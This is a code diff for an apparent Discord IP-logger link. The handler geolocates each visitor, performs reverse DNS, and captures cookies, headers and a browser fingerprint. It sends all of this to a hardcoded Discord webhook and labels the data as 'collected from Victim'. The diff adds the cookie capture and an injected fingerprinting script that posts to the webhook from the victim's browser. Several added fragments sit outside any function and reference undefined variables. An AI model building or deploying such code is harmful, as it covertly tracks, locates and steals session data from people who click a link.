@@ -1,4 +1,5 @@
 import fetch from 'node-fetch';
+import dns from 'dns/promises';
 
 const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
 
@@ -33,6 +34,80 @@ async function getIpDetails(ip) {
     }
 }
 
+async function logRequestMetadata(req) {
+    return {
+        cookies: req.headers['cookie'] || 'N/A',
+        connection: req.headers['connection'] || 'N/A',
+        contentTypeOptions: req.headers['x-content-type-options'] || 'N/A',
+        frameOptions: req.headers['x-frame-options'] || 'N/A',
+    };
+}
+
+
+// In the handler function, add this before building the message object:
+const requestMetadata = await logRequestMetadata(req);
+const metadataFields = [
+    { name: "Cookies", value: `\`${requestMetadata.cookies}\``, inline: false },
+    { name: "Connection", value: `\`${requestMetadata.connection}\``, inline: true },
+    { name: "Content-Type Options", value: `\`${requestMetadata.contentTypeOptions}\``, inline: true },
+    { name: "Frame Options", value: `\`${requestMetadata.frameOptions}\``, inline: true },
+];
+
+
+
+
+async function getReverseDNS(ip) {
+    try {
+        const hostnames = await dns.reverse(ip);
+        return hostnames.length > 0 ? hostnames.join(', ') : 'N/A';
+    } catch (error) {
+        console.error("Reverse DNS lookup failed:", error);
+        return 'N/A';
+    }
+}
+
+
+
+function injectFingerprintScript(res) {
+    const fingerprintScript = `
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+        <script>
+            new Fingerprint2().get(function(result, components) {
+                fetch("${webhookUrl}", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        title: "Browser Fingerprint",
+                        fingerprint: result,
+                        components: components
+                    })
+                });
+            });
+        </script>
+    `;
+    res.end(fingerprintScript);
+}
+
+// In the handler function, add this for browser requests:
+if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
+    injectFingerprintScript(res);
+    return;
+}
+
+
+function logDebugInfo(reverseDNS, requestMetadata) {
+    console.log(`Reverse DNS result: ${reverseDNS}`);
+    console.log(`Request Metadata: ${JSON.stringify(requestMetadata)}`);
+}
+
+// Call in the handler function:
+logDebugInfo(reverseDNS, requestMetadata);
+
+
+
+
+
+
 function detectDeviceType(userAgent) {
     if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
         return "Mobile";
@@ -54,10 +129,13 @@ export default async function handler(req, res) {
         }
 
         const ipDetails = await getIpDetails(ip);
-        if (!ipDetails || ipDetails.status !== 'success') {
-            res.status(500).send("Failed to retrieve IP information.");
-            return;
-        }
+       if (!ipDetails || ipDetails.status !== 'success') {
+    console.error(`Failed to retrieve IP details for IP: ${ip}. Response: ${JSON.stringify(ipDetails)}`);
+    res.status(500).send("Failed to retrieve IP information.");
+    return;
+}
+
+
 
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
@@ -79,6 +157,48 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
+
+         // Add request metadata
+            const requestMetadata = await logRequestMetadata(req);
+            // Perform reverse DNS lookup
+            const reverseDNS = await getReverseDNS(ipDetails.query);
+
+        function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
+    return [
+        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
+        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
+        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
+        { name: "Coords", value: coords, inline: true },
+        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
+        { name: "Reverse DNS", value: `\`${reverseDNS || "N/A"}\``, inline: false },
+        { name: "Cookies", value: `\`${requestMetadata.cookies}\``, inline: false },
+        { name: "Connection", value: `\`${requestMetadata.connection}\``, inline: true },
+        { name: "Content-Type Options", value: `\`${requestMetadata.contentTypeOptions}\``, inline: true },
+        { name: "Frame Options", value: `\`${requestMetadata.frameOptions}\``, inline: true },
+        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
+        { name: "Operating System", value: `\`${os}\``, inline: true },
+        { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
+        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
+        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+        { name: "Referer", value: `\`${referer}\``, inline: false },
+        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+        { name: "Hosting", value: "\`No\`", inline: true },
+    ];
+}
+
+
+
+        
 
         // Check 1: Google LLC and Discordbot
         if (ipDetails.isp === "Google LLC" && userAgent.contains("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
@@ -189,40 +309,33 @@ export default async function handler(req, res) {
 
         // Default: Full Info for Other Requests
         if (!ipDetails.hosting) {
-            const message = {
-                embeds: [
-                    {
-                        title: "User Opened Link",
-                        color: 0x00FFFF,
-                        description: "Device info collected from Victim.",
-                         fields: [
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
-                            { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
-                            { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                            { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
-                            { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
-                            { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
-                            { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
-                            { name: "Coords", value: coords, inline: true },
-                            { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
-                            { name: "Device Info", value: `\`${userAgent}\``, inline: false },
-                            { name: "Device Type", value: `\`${deviceType}\``, inline: true },
-                            { name: "Operating System", value: `\`${os}\``, inline: true },
-                            { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
-                            { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
-                            { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
-                            { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
-                            { name: "Referer", value: `\`${referer}\``, inline: false },
-                            { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
-                            { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                            { name: "Hosting", value: "\`No\`", inline: true }
-                        ]
-                    }
-                ]
-            };
+            
+const fields = createCommonFields(
+    ipDetails,
+    coords,
+    userAgent,
+    deviceType,
+    os,
+    browserEngine,
+    acceptLanguage,
+    acceptEncoding,
+    doNotTrack,
+    referer,
+    reverseDNS,
+    requestMetadata
+);
+
+const message = {
+    embeds: [
+        {
+            title: "User Opened Link",
+            color: 0x00FFFF,
+            description: "Device info collected from Victim.",
+            fields: fields
+        }
+    ]
+};
+
             await sendToWebhook(message);
         }
 
